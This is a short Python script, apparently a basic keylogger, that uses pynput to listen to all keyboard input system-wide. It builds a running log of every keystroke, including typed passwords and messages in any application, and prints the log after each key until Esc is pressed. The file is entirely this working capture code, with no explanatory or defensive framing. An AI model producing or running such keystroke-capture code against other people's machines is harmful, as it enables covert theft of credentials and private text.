from pynput import keyboard


log=""

def onpress(k):
    global log
    try:
        if k== keyboard.Key.enter:
            log += "\n"
        elif k== keyboard.Key.tab:
            log += "\t"
        elif k== keyboard.Key.space:
            log += " "
        elif k== keyboard.Key.shift:
            pass
        elif k== keyboard.Key.backspace and len(log) == 0:
            pass
        elif k== keyboard.Key.backspace and len(log) > 0:
            log = log[:-1]
        elif k== keyboard.Key.ctrl_l or k== keyboard.Key.ctrl_r:
            pass
        elif k== keyboard.Key.esc:
            return False
        else:
           log += str(k).strip("'")
    except KeyError:
        print(KeyError)
    finally:
        print(log)
    

with keyboard.Listener(on_press=onpress) as listener:
    listener.join()